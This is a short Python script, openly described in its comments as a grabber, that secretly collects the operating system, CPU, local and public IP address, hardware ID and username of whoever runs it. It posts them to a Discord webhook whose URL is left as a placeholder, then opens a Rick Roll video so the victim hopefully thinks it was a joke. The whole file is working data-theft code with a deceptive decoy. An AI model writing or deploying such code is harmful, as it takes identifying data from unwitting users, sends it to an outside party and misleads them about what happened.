#This will get the end user's information and display it to your discord webhook as;
#The operating system is:
#The CPU is:
#The IP address is: 
#The public IP address is: 
#The HWID is:
#The username is: 

#It will then open a web browser and send them to youtube Rick Roll to hopefully make them think it was a joke.

import uuid
import socket
import requests
import getpass
import platform
import webbrowser

# Get the user's operating system and version
operating_system = platform.system() + ' ' + platform.release()

# Get the user's CPU information
cpu_info = platform.processor()

# Get the user's IP address
ip_address = socket.gethostbyname(socket.gethostname())

# Get the user's public IP address
public_ip_address = requests.get('https://api.ipify.org/').text


# Get the HWID
hwid = str(uuid.getnode())

# Get the user's account name
username = getpass.getuser()

# Set the webhook URL
webhook_url = 'discord webhook here'

# Set the request data
data = {
    'content': 'The operating system is: {}\nThe CPU is: {}\nThe IP address is: {}\nThe public IP address is: {}\nThe HWID is: {}\nThe username is: {}'.format(operating_system, cpu_info, ip_address, public_ip_address, hwid, username)
}

# Send the request to the Discord API
response = requests.post(webhook_url, json=data)



webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
